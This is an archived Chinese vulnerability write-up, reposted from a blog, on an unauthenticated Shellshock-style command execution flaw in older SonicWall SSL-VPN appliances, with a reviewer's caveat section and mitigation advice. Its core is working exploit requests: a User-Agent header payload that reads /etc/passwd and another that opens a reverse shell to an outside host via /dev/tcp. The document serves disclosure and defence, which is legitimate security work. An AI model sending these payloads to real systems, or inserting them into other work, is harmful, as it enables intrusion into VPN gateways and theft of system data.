---
source: "MrWQ/vulnerability-paper"
id: "vw-403b073318fc0712b3eb1d3a"
entity_id: "ve-403b073318fc0712b3eb1d3a"
schema_version: "1"
title: "SonicWall SSL-VPN 远程命令执行漏洞"
product: "SonicWall SSL-VPN / SMA旧版"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "声称vpn<8.0.0.4；请求无需认证"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/SonicWall/SonicWall%20SSL-VPN%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据；回连样例可能向外部地址发送网络请求或建立会话；应使用自己的隔离回连服务，DNS/LDAP 到达只能证明相应交互，不能单独证明 RCE"
source_url: "https://mp.weixin.qq.com/s/NQRJOIol0KuaHCQHuo6DjQ"
source_status: "recorded"
---

# SonicWall SSL-VPN 远程命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：SonicWall SSL-VPN / SMA旧版
- 本文讨论：jarrewrite.sh Shellshock
- 版本、权限与配置前提：声称vpn&lt;8.0.0.4；请求无需认证
- 资料类型：HTTP PoC及缓解转载；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 根因说旧内核而请求体现Bash Shellshock，应分清内核与解释器
- 两个Accept头合并一行；过滤仅User-Agent和单路径未证明覆盖所有入口，不能替代补丁
- 无厂商公告来源，版本产品命名泛化
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据
- 回连样例可能向外部地址发送网络请求或建立会话；应使用自己的隔离回连服务，DNS/LDAP 到达只能证明相应交互，不能单独证明 RCE

### 待核与来源

- 官方修复版本及其他CGI/头部暴露待核验
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/NQRJOIol0KuaHCQHuo6DjQ)

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjeiaDMO8Z5dS0bzibhpgv5icoLkLzWXSXicO8G3k3BF2Nia0Ud57mKB1FBd9uthDvkY56pzmI9X6ZklZicg/640?wx_fmt=png)  

SonicWall SSL-VPN 远程命令执行漏洞

一、漏洞描述

SonicWall SSL-VPN 历史版本远程命令执行漏洞以及相关利用脚本。由于 SonicWall SSL-VPN 使用了旧版本内核以及 HTTP CGI 可执行程序，攻击者可构造恶意其 HTTP 请求头，造成远程任意命令执行，并获得主机控制权限，软件影响版本 vpn<8.0.0.4

二、漏洞复现

exp：

```http
GET /cgi-bin/jarrewrite.sh HTTP/1.1 
Host: thelostworld:8080 
User-Agent: () { :; }; echo ; /bin/bash -c "cat /etc/passwd" 
Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 
Accept-Encoding: gzip, deflate 
Connection: close
```

访问执行查看：cat /etc/passwd

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjeiaDMO8Z5dS0bzibhpgv5icoL8JA8fD6yp7ib3jkkc0ia2xXaAruWOnjAlibomUiaOIaoDtT97JwLictB0eQ/640?wx_fmt=png)

执行反弹 shell

```http
GET /cgi-bin/jarrewrite.sh HTTP/1.1 
Host: thelostworld:8080  
User-Agent: () { :; }; echo ; /bin/bash -c "nohup bash -i >& /dev/tcp/thelostworld/8080 0>&1 &" 
Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 
Accept-Encoding: gzip, deflate 
Connection: close
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjeiaDMO8Z5dS0bzibhpgv5icoLicyic18nc7svibFbG4WO7uzDDY5UH8bkjeiaDba7zQeg83lJ5sc6W3zD8w/640?wx_fmt=png)

成功获取到 shell：

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjeiaDMO8Z5dS0bzibhpgv5icoL6iaDMD0BTXmpztjCZut1iaVUibpKicdaUyrajON667avJDxtQRgwPVDWJg/640?wx_fmt=png)

简单的脚本尝试验证：

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjeiaDMO8Z5dS0bzibhpgv5icoL9X67peicqo6VQCn0ePZicJjPw7cNoQlvm8dTmuZFJ9VMEesrqTwRyPhw/640?wx_fmt=png)

执行打印：  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjeiaDMO8Z5dS0bzibhpgv5icoLPPvMs8SL60hh3RjDYZCOPA2dogyJ6icUWBd1oufH53jYm0Od3JlN4GA/640?wx_fmt=png)

三、防护修补建议

通用修补建议

升级到  Sonic SMA 8.0.0.4

临时修补建议

针对 http header 进行检测

可能存在的特征字符串如下 () { :;};

使用 nginx 反向代理对 header 进行强制过滤

```
location  /cgi-bin/jarrewrite.sh {
    proxy_pass http://your-ssl-vpn:your-ssl-vpn-port$request_uri;
    proxy_set_header host $http_host;
    proxy_set_header user-agent "sonicwall ssl-vpn rec fix";
}
```

参考：

 https://my.oschina.net/u/4600927/blog/4927559

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人 CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF 主页：https://www.freebuf.com/author/thelostworld?type=article

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)

欢迎添加本公众号作者微信交流，添加时备注一下 “公众号”  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3ibf9GUyuOCzpVJBq6z1Z60vzBjlEWLAu4gD9Lk4S57BcEiaGOibJfoXicQ/640?wx_fmt=png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
